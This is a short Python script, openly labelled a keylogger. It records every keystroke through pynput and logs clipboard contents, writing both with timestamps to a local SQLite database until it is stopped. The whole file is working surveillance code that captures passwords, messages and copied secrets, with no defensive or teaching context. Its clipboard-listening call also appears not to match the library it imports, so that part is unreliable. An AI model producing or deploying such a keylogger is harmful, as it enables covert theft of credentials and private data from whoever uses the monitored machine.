import sqlite3
from pynput import keyboard
import time
import clipboard

# Create a SQLite database and table
conn = sqlite3.connect('keylogger.db')
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS clipboard_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        text TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
''')

conn.commit()

# Function to save key logs
def on_press(key):
    try:
        key_str = key.char
    except:
        key_str = str(key)

    cursor.execute("INSERT INTO keylogs (key) VALUES (?)", (key_str,))
    conn.commit()

# Function to save clipboard logs
def on_clipboard_change(text):
    cursor.execute("INSERT INTO clipboard_logs (text) VALUES (?)", (text,))
    conn.commit()

# Start listening for key presses
keyboard.Listener(on_press=on_press).start()

# Start listening for clipboard changes
clipboard.listen(on_change=on_clipboard_change)

# Keep the script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    conn.close()
    print("Keylogger stopped.")
